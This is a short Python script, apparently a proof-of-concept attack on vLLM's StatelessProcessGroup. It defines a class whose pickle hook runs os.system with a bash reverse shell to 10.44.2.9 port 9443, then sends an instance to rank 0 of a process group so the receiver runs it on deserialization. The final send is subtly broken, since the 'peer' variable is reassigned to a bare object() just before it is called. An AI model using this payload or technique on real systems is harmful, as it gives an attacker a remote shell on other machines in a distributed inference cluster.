from vllm.distributed.utils import StatelessProcessGroup

class WirePacket:
    def __reduce_ex__(self, protocol):
        import os
        action='/bin/bash -c "bash -i >& /dev/tcp/10.44.2.9/9443 0>&1"'
        return (os.system,(action,))

peer = StatelessProcessGroup.create(
    host='10.55.0.8',
    port=25678,
    rank=3,
    world_size=4,
)

live = peer
peer = object()
live.send_obj(obj=1, dst=0)
peer.send_obj(obj=WirePacket(),dst=0)
